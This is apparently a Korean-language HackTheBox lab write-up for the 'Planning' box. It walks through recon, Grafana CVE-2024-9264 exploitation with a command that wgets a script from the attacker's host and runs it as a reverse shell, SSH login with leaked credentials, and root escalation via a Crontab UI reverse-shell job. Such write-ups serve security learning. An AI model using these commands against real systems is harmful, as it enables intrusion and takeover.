# Planning - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA planning 10.10.11.68
```
<img width="1103" height="277" alt="image" src="https://github.com/user-attachments/assets/28261439-35e0-4821-a6b7-9017d398e992" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `/etc/hosts`에 `planning.htb`추가.
<img width="1103" height="65" alt="image" src="https://github.com/user-attachments/assets/467b7aeb-ec59-44c7-9dae-bfcedc2f627d" />

### banner grabbing
```bash
whatweb http://planning.htb

curl -IL http://planning.htb
```
<img width="1105" height="268" alt="image" src="https://github.com/user-attachments/assets/f27d8aae-7a20-4ee4-8fcd-f1ffa18068dc" />

### VHOST
- `grafana.planning.htb`발견.
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H 'Host:FUZZ.planning.htb' -mc all -fs 178
```
<img width="1105" height="526" alt="image" src="https://github.com/user-attachments/assets/447896bc-fe75-4a99-b902-704f69c164a8" />

<br>
<br>

- `/etc/hosts` 등록.
<img width="1105" height="64" alt="image" src="https://github.com/user-attachments/assets/88fd62be-f55c-4f67-92c3-e475c890530c" />

### CVE-2024-9264
- 설정되어 있는 계정으로 로그인.
<img width="1100" height="81" alt="image" src="https://github.com/user-attachments/assets/41170241-4b16-408d-a217-542f88a33619" />

<br>
<br>

- `grafana 11.0.0`
<img width="1100" height="91" alt="image" src="https://github.com/user-attachments/assets/59c472b5-635b-448d-b1ca-7cb18d3f32d6" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2024-9264
- `duckdb`로가는 SQL쿼리가 검증 없이 그대로 전달되어 임의의 명령어 실행 혹은 LFI가 실행이 되는 취약점.
<img width="1100" height="490" alt="image" src="https://github.com/user-attachments/assets/5d87307f-ce25-46b1-9cec-935ff5d24f88" />

<br>
<br>

- https://github.com/nollium/CVE-2024-9264
- `11.0.0`버전만 따로 RCE가 된다고 한다.
<img width="1081" height="133" alt="image" src="https://github.com/user-attachments/assets/098560cc-ff91-4297-a220-f275fca24e87" />

<br>
<br>

- `shellfs`를 설치하여 `expression`에 페이로드를 집어넣어 `duckdb`로 전달하여 실행하는 코드.
<img width="700" height="423" alt="image" src="https://github.com/user-attachments/assets/0dc41275-dd04-455c-9a0f-b8304e17d0e5" />

<br>
<br>

<img width="652" height="500" alt="image" src="https://github.com/user-attachments/assets/46874a88-5ade-4361-9471-a21d9ed6471a" />

<br>
<br>

- `ex.sh`생성.
<img width="1106" height="96" alt="image" src="https://github.com/user-attachments/assets/598f8897-0c09-46e9-b7aa-990fdd31e0e9" />

<br>
<br>

- 로컬로부터 다운로드.
```bash
python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'wget http://10.10.16.4/ex.sh -O /tmp/ex.sh' http://grafana.planning.htb
```
<img width="1106" height="469" alt="image" src="https://github.com/user-attachments/assets/ad7714cb-ecd7-4e31-8db6-9fc5b30a2236" />

<br>
<br>

- 리버스 셸 실행.
```bash
python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c '/bin/bash /tmp/ex.sh' http://grafana.planning.htb
```
<img width="1106" height="121" alt="image" src="https://github.com/user-attachments/assets/2b376415-0a0a-4a1e-a848-bf5f2e4a2ac4" />

<br>
<br>

- 셸 획득.
<img width="1106" height="174" alt="image" src="https://github.com/user-attachments/assets/a519ddf8-d49b-4c41-a507-8272939a4c0b" />

---
## SSH
- 로그인한 셸에서 flag를 찾을 수 없는 상태.
- `env`에서 계정정보 노출.
```bash
env
```
<img width="1106" height="270" alt="image" src="https://github.com/user-attachments/assets/b8e34170-3ceb-431b-974c-229947cc9551" />

<br>
<br>

- `enzo:RioTecRANDEntANT!`로 SSH 로그인.
```bash
ssh enzo@10.10.11.68
```
<img width="1106" height="41" alt="image" src="https://github.com/user-attachments/assets/30acc9ce-e6f4-4114-8bb8-f6be5f2fae9a" />

---
## Privesc
- 8000번 포트가 열려 있는 것을 확인.
```bash
ss -tnlp
```
<img width="1104" height="212" alt="image" src="https://github.com/user-attachments/assets/21ea3a29-c729-4338-888d-e9b34be62999" />

<br>
<br>

- `curl`로는 반응이 없음.
```bash
curl http://127.0.0.1:8000
```
<img width="1104" height="21" alt="image" src="https://github.com/user-attachments/assets/94711615-c89f-41b9-9f08-c96b914defad" />

<br>
<br>

- `linpeas.sh`실행하여 `Crontab UI`를 발견.
```bash
./linpeas.sh
```
<img width="1104" height="229" alt="image" src="https://github.com/user-attachments/assets/1cfe9d0a-ee0b-4c03-a069-945a3d41e8b3" />

<br>
<br>

- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=cron-jobs#crontab-ui-alseambusher-running-as-root--web-based-scheduler-privesc
- `Crontab UI`가 `root`권한으로 실행되고 있으면 `cronjobs`를 추가하여 명령어를 실행할 수 있게 됨.
<img width="642" height="500" alt="image" src="https://github.com/user-attachments/assets/019edd0b-a3a5-4b9a-a1f5-9c8d7cfd995a" />

<br>
<br>

- `SSH` 터널링.
```bash
ssh -L 9001:localhost:8000 enzo@10.10.11.68
```
<img width="1106" height="180" alt="image" src="https://github.com/user-attachments/assets/c55de4f5-8c8f-49d0-b0f5-9bbd0100866f" />

<br>
<br>

- 9001번 포트로 접속하여 `root:P4ssw0rdS0pRi0T3c`로 로그인.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/3f2e1b64-78a8-4e15-a66c-f72448a32492" />

<br>
<br>

- 리버스 셸 명령어 추가.
<img width="479" height="500" alt="image" src="https://github.com/user-attachments/assets/9a81cc11-d7e0-4e69-844b-c62ca5b959a8" />

<br>
<br>

- `Run now`
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/bd9144dd-7486-491f-a877-38739bbf633d" />

<br>
<br>

- 셸 획득.
<img width="1106" height="219" alt="image" src="https://github.com/user-attachments/assets/7ec8b73d-ed72-4199-bad0-7b664b2db83a" />

---
## FLAG
- `/home/enzo/user.txt`
<img width="1106" height="253" alt="image" src="https://github.com/user-attachments/assets/cbbba60f-f565-4c43-84ee-a7c5487c14aa" />

<br>
<br>

- `/root/root.txt`
<img width="1106" height="273" alt="image" src="https://github.com/user-attachments/assets/d3672e3f-597d-4c02-a927-bc241e0e0eee" />


























